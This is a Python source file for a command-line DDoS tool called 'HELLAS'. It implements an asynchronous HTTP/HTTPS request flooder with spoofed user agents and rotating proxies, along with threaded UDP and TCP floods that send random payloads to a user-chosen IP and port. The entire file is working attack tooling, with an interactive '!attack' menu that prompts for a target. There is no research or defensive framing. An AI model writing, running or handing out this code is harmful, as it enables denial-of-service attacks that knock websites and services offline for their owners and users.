import os
import asyncio
import aiohttp
import threading
import socket
import random
import time

# === Banner ===
def banner():
    os.system("clear")
    print("\033[94m")
    print(r"""
██╗  ██╗███████╗██╗     ██╗      █████╗ ███████╗
██║  ██║██╔════╝██║     ██║     ██╔══██╗██╔════╝
███████║█████╗  ██║     ██║     ███████║███████╗
██╔══██║██╔══╝  ██║     ██║     ██╔══██║╚════██║
██║  ██║███████╗███████╗███████╗██║  ██║███████║
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
    """)
    print("\033[0m")

# === Global user agents ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
    "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
]


# === Load proxies ===
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] proxies.txt not found. Continuing without proxies.")
        return []

# === Async HTTP/HTTPS flooder ===
async def http_flood(url, total_requests, concurrent_tasks, use_proxies):
    proxies = load_proxies() if use_proxies else []

    async def send(session):
        proxy = None
        if proxies:
            proxy = "http://" + random.choice(proxies)

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Connection": "keep-alive",
            "Accept": "*/*",
        }
        try:
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
                print(f"[{resp.status}]")
        except:
            print("[FAIL]")

    async def bound_flood():
        connector = aiohttp.TCPConnector(limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [send(session) for _ in range(total_requests // concurrent_tasks)]
            await asyncio.gather(*tasks)

    start = time.time()
    await asyncio.gather(*[bound_flood() for _ in range(concurrent_tasks)])
    end = time.time()
    print(f"\n✅ Sent {total_requests} requests in {round(end - start, 2)}s. RPS: {round(total_requests / (end - start))}")

# === UDP flood ===
def udp_flood(ip, port, threads, duration):
    def flood():
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            try:
                sock.sendto(random._urandom(1024), (ip, port))
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=flood).start()

# === TCP flood ===
def tcp_flood(ip, port, threads, duration):
    def flood():
        timeout = time.time() + duration
        payload = random._urandom(1024)
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(payload)
                s.close()
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=flood).start()

# === CLI commands ===
def show_help():
    print("""
Commands:
!help        Show help menu
!methods     Show attack methods
!attack      Start an attack
""")
def show_methods():
    print("""
Methods:
http     - HTTP GET (with optional proxies)
https    - HTTPS GET (with optional proxies)
tcp      - TCP flood
udp      - UDP flood
""")
# === CLI main ===
async def cli():
    while True:
        cmd = input("HELLAS > ").strip().lower()
        if cmd == "!help":
            show_help()
        elif cmd == "!methods":
            show_methods()
        elif cmd == "!attack":
            method = input("Method (http/https/tcp/udp): ").strip().lower()
            if method in ["http", "https"]:
                url = input("Target URL: ").strip()
                total = int(input("Total Requests: "))
                tasks = int(input("Concurrent Tasks: "))
                use_proxy = input("Use proxies? (y/n): ").strip().lower() == 'y'
                await http_flood(url, total, tasks, use_proxy)
            elif method == "udp":
                ip = input("Target IP: ").strip()
                port = int(input("Port: "))
                threads = int(input("Threads: "))
                duration = int(input("Duration (seconds): "))
                udp_flood(ip, port, threads, duration)
                print(f"UDP flood started on {ip}:{port} for {duration}s with {threads} threads.")
            elif method == "tcp":
                ip = input("Target IP: ").strip()
                port = int(input("Port: "))
                threads = int(input("Threads: "))
                duration = int(input("Duration (seconds): "))
                tcp_flood(ip, port, threads, duration)
                print(f"TCP flood started on {ip}:{port} for {duration}s with {threads} threads.")
            else:
                print("❌ Unknown method.")
        else:
            print("❌ Unknown command. Use !help")

# === Main ===
if __name__ == "__main__":
    banner()
    try:
        asyncio.run(cli())
    except KeyboardInterrupt:
        print("\n⛔ Interrupted.")
